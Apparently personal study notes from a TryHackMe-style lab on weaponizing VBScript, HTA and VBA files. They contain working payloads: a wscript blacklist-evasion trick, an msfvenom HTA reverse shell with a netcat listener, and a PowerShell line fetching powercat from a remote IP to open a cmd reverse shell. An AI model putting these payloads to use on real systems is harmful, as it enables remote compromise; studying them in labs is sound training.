@@ -1,0 +1,126 @@
+
+ ### -------- VBS Scripts ------###
+ 
+ 
+ 1. Print simple welcome msg:--->
+ 
+ Dim message 
+message = "Welcome to THM"
+MsgBox message
+
+Save it .vbs extension
+
+PS> .\hlo.vbs
+
+==================================
+
+ 2. VBScript to run executable files:---->
+ ------------------------------------
+ 
+ Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+ 
+Save .vbs extension
+
+PS> payload.vbs
+
+
+EXPLANATION:--
+We create an object of the WScript library using CreateObject to call the execution payload. Then, we utilize the Run method to execute the payload. For this task, we will run the Windows calculator calc.exe. 
+
+NOTE:
+
+ We can also run it via wscript as follows,
+ 
+ PS> wscript <vbs file name/path>
+ PS> wscript payload.vbs
+ 
+--------- 
+Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,
+Terminal
+
+           
+c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
+ 
+
+The result will be as exact as executing the vbs files, which run the calc.exe binary.
+
+================================================
+  
+ ###----- An HTML Application - HTA -----##
+ 
+HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 
+
+In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.
+-----------
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+----------
+Then serve the payload.hta from a web server, this could be done from the attacking machine as follows, 
+  
+Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.  
+  
+
+#---- HTA Reverse Connection ----#
+
+We can create a reverse shell payload as follows,  
+  
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta 
+
+Once the victim visits the malicious URL and hits run, we get the connection back.
+
+$ nc -nvlp 443
+
+=============================================
+
+ ##---- Visual Basic for Application - VBA ------##
+-------------------------------------------
+ 
+VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. 
+
+Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface (API) and other low-level functionality. For more information about VBA, visit here. 
+
+In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.
+
+Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period. 
+  
+  
+  
+  
+  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.17.15.173:8080/powercat.ps1');powercat -c 10.17.15.173 -p 1337 -e cmd"
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
